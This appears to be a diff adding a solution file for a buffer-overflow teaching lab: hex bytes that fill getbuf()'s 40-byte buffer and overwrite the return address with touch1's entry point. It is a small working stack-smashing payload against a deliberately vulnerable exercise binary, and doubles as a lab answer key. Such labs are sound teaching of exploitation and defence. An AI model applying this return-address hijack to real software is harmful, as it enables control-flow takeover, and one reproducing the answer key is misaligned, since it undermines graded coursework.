@@ -1,0 +1,8 @@
+/* Fill getbuf()'s buffer (40 bytes) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Overwrite the return address with touch1's entry point */
+c0 17 40 00 00 00 00 00
